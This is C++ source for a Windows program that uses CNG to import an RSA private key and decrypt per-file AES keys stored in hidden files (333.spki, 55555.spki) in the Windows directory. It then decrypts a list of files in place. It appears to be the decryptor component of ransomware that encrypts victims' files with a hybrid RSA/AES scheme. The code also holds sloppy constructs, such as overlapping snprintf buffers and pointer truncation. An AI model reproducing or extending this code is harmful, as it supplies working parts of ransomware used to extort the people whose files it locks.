#include "crypt.h"

void print_byte(PBYTE data, DWORD size) {
	for (DWORD i = 0; i < size; ++i) {
		printf("0x%02x, ", data[i]);
		if ((i + 1) % 10 == 0) putchar('\n');
	}
}
void print_error(const char* e, NTSTATUS x) {
	printf("Error! %s with code: 0x%x\n", e, x);
	switch (x) {
	case NTE_BAD_FLAGS:
		printf("NTE_BAD_FLAGS\n");
		break;
	case NTE_INVALID_HANDLE:
		printf("NTE_INVALID_HANDLE\n");
		break;
	case NTE_INVALID_PARAMETER:
		printf("NTE_INVALID_PARAMETER\n");
		break;
	case NTE_NO_MEMORY:
		printf("NTE_NO_MEMORY\n");
		break;
	case NTE_NOT_SUPPORTED:
		printf("NTE_NOT_SUPPORTED\n");
		break;
	case NTE_BAD_KEY_STATE:
		printf("NTE_BAD_KEY_STATE\n");
		break;
	case NTE_BAD_TYPE:
		printf("NTE_BAD_TYPE\n");
		break;
	default:
		printf("Unknown Error.\n");
	}
}
bool import_asymmetric_key(NCRYPT_PROV_HANDLE* handle, NCRYPT_KEY_HANDLE* key, DWORD buffer_size, LPVOID buffer, LPCWSTR type) {
	HANDLE file;
	DWORD file_size, ret;
	LPVOID buff;
	NTSTATUS status;

	if (*handle) NCryptFreeObject(*handle);
	if (*key) NCryptDeleteKey(*key, NCRYPT_SILENT_FLAG);

	if (buffer == NULL || buffer_size == 0) {
		file = CreateFileA("key.txt", GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (file == INVALID_HANDLE_VALUE) {
			printf("key.txt failed to open.\n");
			return false;
		}
		file_size = GetFileSize(file, 0);
		buff = HeapAlloc(GetProcessHeap(), 0, file_size);
		if (buff == 0) {
			printf("buff memory allocation failed.\n");
			return false;
		}
		if (ReadFile(file, buff, file_size, &ret, NULL) == 0) {
			printf("readfile failed with code: %lu\n", GetLastError());
			return false;
		}
	}
	else {
		buff = buffer;
		ret = buffer_size;
	}
	if (!NT_SUCCESS(status = NCryptOpenStorageProvider(handle, NULL, 0))) {
		print_error("NCryptOpenStorageProvider", status);
		return false;
	}
	if (memcmp(type, BCRYPT_RSAPUBLIC_BLOB, wcslen(type)) == 0) {
		if (!NT_SUCCESS(status = NCryptImportKey(*handle, NULL, BCRYPT_RSAPUBLIC_BLOB, NULL, key, (PBYTE)buff, ret, NCRYPT_SILENT_FLAG))) {
			print_error("NCryptImportKey failed", status);
			return false;
		}
	}
	else if (memcmp(type, BCRYPT_RSAFULLPRIVATE_BLOB, wcslen(type)) == 0) {
		if (!NT_SUCCESS(status = NCryptImportKey(*handle, NULL, BCRYPT_RSAFULLPRIVATE_BLOB, NULL, key, (PBYTE)buff, ret, NCRYPT_SILENT_FLAG))) {
			print_error("NCryptImportKey failed", status);
			return false;
		}
	}
	else return false;
	return true;
}

int decrypt(LPVOID pri_key_buff, HWND hwnd) {
	NTSTATUS status;
	WSADATA wsa;
	HANDLE file = NULL;
	int sock_res = 0;
	NCRYPT_KEY_HANDLE key = NULL;
	NCRYPT_PROV_HANDLE handle = NULL;
	LPVOID read_file = NULL, tmp = NULL, write_file = NULL;
	DWORD ret = 0, file_size = 0, pri_key_len = 603, len = 0, decrypt_size = 0, do_more = 0, key_object_len = 0, file_path_len = 0, tfile_path_len = 0;
	HKEY hkey = NULL;
	SOCKET sock = INVALID_SOCKET;
	pAES_KEY_DIR act = NULL;
	BCRYPT_ALG_HANDLE alg_handle = 0;
	BCRYPT_KEY_HANDLE key_handle = 0;
	PBYTE key_object = NULL;
	pFileLinkedList file_head = NULL;
	char file_path[MAX_PATH] = { 0 };
	char location[MAX_PATH];

	SHGetFolderPathA(NULL, CSIDL_WINDOWS, NULL, SHGFP_TYPE_CURRENT, location);

	_snprintf(location, strlen(location) + 10, "%s\\333.spki", location);

	tmp = HeapAlloc(GetProcessHeap(), 0, 128);

	if (import_asymmetric_key(&handle, &key, pri_key_len, pri_key_buff, BCRYPT_RSAFULLPRIVATE_BLOB) == false) {
		MessageBoxA(hwnd, "import asymmetric key failed", ":(", MB_OK);
		return 1;
	}
	else {
		file = CreateFileA(location, GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (file == INVALID_HANDLE_VALUE) {
			MessageBoxA(hwnd, "failed to open 333.spki", ":(", MB_OK);
			return 1;
		}
		file_size = GetFileSize(file, NULL);
		read_file = HeapAlloc(GetProcessHeap(), 0, file_size);
		if (read_file == NULL) {
			printf("read_file heap allocation failed.\n");
			MessageBoxA(hwnd, "read_file heap allocation failed", ":(", MB_OK);
			return 1;
		}
		if (ReadFile(file, read_file, file_size, &ret, NULL) == false) {
			printf("failed to read from file.\n");
			MessageBoxA(hwnd, "failed to read from file", ":(", MB_OK);
			return 1;
		}
		CloseHandle(file);
		len = (sizeof(AES_KEY_DIR) / 100 + 1) * 128;
		char* encrypted = new char[len];

		act = new AES_KEY_DIR[file_size / len];
		DWORD ofset = 0;
		printf("decrypting keys saved in 333.spki\n");
		for (int i = 0; i < file_size / len; ++i) {
			memcpy(encrypted, LPVOID((DWORD)read_file + i * len), len);
			decrypt_size = len;
			do_more = ofset = 0;
			while (1) {
				if (decrypt_size > 128) {
					memcpy(tmp, (LPVOID)((DWORD)encrypted + do_more * 128), 128);
					++do_more;
				}
				else {
					memcpy(tmp, (LPVOID)((DWORD)encrypted + do_more * 128), decrypt_size);
					do_more = 0;
				}
				if (!NT_SUCCESS(status = NCryptDecrypt(key, (PBYTE)tmp, decrypt_size > 128 ? 128 : decrypt_size, NULL, NULL, NULL, & ret, NCRYPT_PAD_PKCS1_FLAG))) {
					print_error("NCryptDecrypt1 failed", status);
					MessageBoxA(hwnd, "NCryptDecrypt1 failed", ":(", MB_OK);
					break;
				}
				if (!NT_SUCCESS(status = NCryptDecrypt(key, (PBYTE)tmp, decrypt_size > 128 ? 128 : decrypt_size, NULL, (PBYTE)((DWORD)&act[i] + ofset), ret, & ret, NCRYPT_PAD_PKCS1_FLAG))) {
					print_error("NCryptDecrypt2 failed", status);
					MessageBoxA(hwnd, "NCryptDecrypt2 failed", ":(", MB_OK);
					break;
				}
				ofset += ret;
				if (do_more == 0) break;
				decrypt_size -= 128;
			}
		}
		if (read_file) HeapFree(GetProcessHeap(), 0, read_file);
	}

	if (!NT_SUCCESS(status = BCryptOpenAlgorithmProvider(&alg_handle, BCRYPT_AES_ALGORITHM, NULL, 0))) {
		print_error("BCryptOpenAlgorithmProvider failed", status);
		MessageBoxA(hwnd, "BCryptOpenAlgorithmProvider failed", ":(", MB_OK);
		return 1;
	}
	if (!NT_SUCCESS(status = BCryptGetProperty(alg_handle, BCRYPT_OBJECT_LENGTH, (PBYTE)&key_object_len, sizeof(DWORD), &ret, 0))) {
		print_error("BCryptGetProperty failed", status);
		MessageBoxA(hwnd, "BCryptGetProperty failed", ":(", MB_OK);
		return 1;
	}
	key_object = (PBYTE)HeapAlloc(GetProcessHeap(), 0, key_object_len);
	if (key_object == NULL) {
		printf("pkey_object memory allocation failed.\n");
		MessageBoxA(hwnd, "pkey_object memory allocation failed", ":(", MB_OK);
		return 1;
	}
	if (!NT_SUCCESS(status = BCryptSetProperty(alg_handle, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0))) {
		print_error("BCryptSetProperty failed", status);
		MessageBoxA(hwnd, "BCryptSetProperty failed", ":(", MB_OK);
		return 1;
	}

	memset(location, 0, MAX_PATH);

	SHGetFolderPathA(NULL, CSIDL_WINDOWS, NULL, SHGFP_TYPE_CURRENT, location);

	_snprintf(location, strlen(location) + 12, "%s\\55555.spki", location);

	file = CreateFileA(location, GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (file == INVALID_HANDLE_VALUE) {
		printf("failed to open 55555.spki\n");
		MessageBoxA(hwnd, "failed to open 55555.spki", ":(", MB_OK);
		return 1;
	}

	file_size = GetFileSize(file, 0);
	read_file = HeapAlloc(GetProcessHeap(), 0, file_size);
	if (read_file == NULL) {
		printf("read_file allocation failed\n");
		MessageBoxA(hwnd, "read_file allocation failed", ":(", MB_OK);

		return 1;
	}
	if (!ReadFile(file, read_file, file_size, &file_size, NULL)) {
		printf("ReadFile failed\n");
		MessageBoxA(hwnd, "ReadFile failed", ":(", MB_OK);
		return 1;
	}
	for (int i = 0; i < (file_size / sizeof(FileLinkedList)); ++i) {
		pFileLinkedList t = new FileLinkedList;
		memcpy(t, LPVOID((DWORD)read_file + (sizeof(FileLinkedList) * i)), sizeof(FileLinkedList));
		if (file_head == NULL) {
			t->next = NULL;
			t->pre = NULL;
			file_head = t;
		}
		else {
			t->next = file_head;
			t->pre = NULL;
			file_head->pre = t;
			file_head = t;
		}
	}

	HeapFree(GetProcessHeap(), 0, read_file);

	int j = 0;
	int i = 0;
	for (pFileLinkedList t = file_head; t != NULL; t = t->next) {
		for (j = strlen(t->file_path); j >= 0; --j) {
			if (t->file_path[j] == '\\') {
				break;
			}
		}

		tfile_path_len = strlen(t->file_path) - strlen(&t->file_path[j]) + 1;
		file_path_len = strlen(file_path);

		if ((memcmp(file_path, t->file_path, tfile_path_len < file_path_len ? tfile_path_len : file_path_len) == 0) && (tfile_path_len == file_path_len) && strlen(file_path) != 0) goto jamp;
		if (key_handle) BCryptDestroyKey(key_handle);

		memset(key_object, 0, key_object_len);

		if (!NT_SUCCESS(status = BCryptImportKey(alg_handle, NULL, BCRYPT_OPAQUE_KEY_BLOB, &key_handle, key_object, key_object_len, act[i].aes, act[i].aes_length, NULL))) {
			print_error("BCryptImportKey failed", status);
			MessageBoxA(hwnd, "BCryptImportKey failed", ":(", MB_OK);
			return 1;
		}
		memset(file_path, 0, MAX_PATH);
		memcpy(file_path, act[i].file_path, strlen(act[i].file_path));
		++i;
	jamp:
		file = CreateFileA(t->file_path, GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (file == INVALID_HANDLE_VALUE) {
			printf("failed to open file.\n");
			//MessageBoxA(hwnd, "failed to open file", ":(", MB_OK);
			continue;
		}
		file_size = GetFileSize(file, NULL);
		read_file = HeapAlloc(GetProcessHeap(), 0, file_size);
		if (read_file == NULL) {
			continue;
		}
		if (!ReadFile(file, read_file, file_size, &ret, NULL)) {
			printf("failed to read from file.\n");
			//MessageBoxA(hwnd, "failed to read from file", ":(", MB_OK);
			HeapFree(GetProcessHeap(), 0, read_file);
			CloseHandle(file);
			continue;
		}

		memcpy(act[i - 1].iv, act[i - 1].civ, act[i - 1].block_len);

		if (!NT_SUCCESS(status = BCryptDecrypt(key_handle, (PBYTE)read_file, file_size, NULL, act[i - 1].iv, act[i - 1].block_len, NULL, NULL, &ret, BCRYPT_BLOCK_PADDING))) {
			print_error("BCryptDecrypt1 failed", status);
			//MessageBoxA(hwnd, "BCryptDecrypt1 failed", ":(", MB_OK);
			HeapFree(GetProcessHeap(), 0, read_file);
			CloseHandle(file);
			continue;
		}
		write_file = HeapAlloc(GetProcessHeap(), NULL, ret);
		if (write_file == NULL) {
			printf("failed to allocate write_file.\n");
			//MessageBoxA(hwnd, "failed to allocate write_file", ":(", MB_OK);
			HeapFree(GetProcessHeap(), 0, read_file);
			CloseHandle(file);
			continue;
		}
		if (!NT_SUCCESS(status = BCryptDecrypt(key_handle, (PBYTE)read_file, file_size, NULL, act[i - 1].iv, act[i - 1].block_len, (PBYTE)write_file, ret, &ret, BCRYPT_BLOCK_PADDING))) {
			print_error("BCryptDecrypt1 failed", status);
			//MessageBoxA(hwnd, "BCryptDecrypt1 failed", ":(", MB_OK);
			HeapFree(GetProcessHeap(), 0, read_file);
			HeapFree(GetProcessHeap(), 0, write_file);
			CloseHandle(file);
			continue;
		}
		CloseHandle(file);
		file = CreateFileA(t->file_path, GENERIC_READ | GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (file == INVALID_HANDLE_VALUE) {
			printf("failed to open/create file.\n");
			//MessageBoxA(hwnd, "failed to open/create file", ":(", MB_OK);
			HeapFree(GetProcessHeap(), 0, read_file);
			HeapFree(GetProcessHeap(), 0, write_file);
			continue;
		}
		if (ret != t->size) printf("WIERED O_o %s - ret: %lu - t->size: %lld\n", t->file_path, ret, t->size);
		if (!WriteFile(file, write_file, ret, &ret, NULL)) {
			printf("failed to write to file.\n");
			//MessageBoxA(hwnd, "failed to write to file", ":(", MB_OK);
			HeapFree(GetProcessHeap(), 0, read_file);
			HeapFree(GetProcessHeap(), 0, write_file);
			CloseHandle(file);
			continue;
		}
		CloseHandle(file);
		HeapFree(GetProcessHeap(), 0, read_file);
		HeapFree(GetProcessHeap(), 0, write_file);
	}
	pFileLinkedList t1;
	for (pFileLinkedList t = file_head; t != NULL;) {
		t1 = t;
		t = t->next;
		delete t1;
	}
	delete[] act;
	HeapFree(GetProcessHeap(), 0, tmp);
	HeapFree(GetProcessHeap(), 0, key_object);
	return 0;
}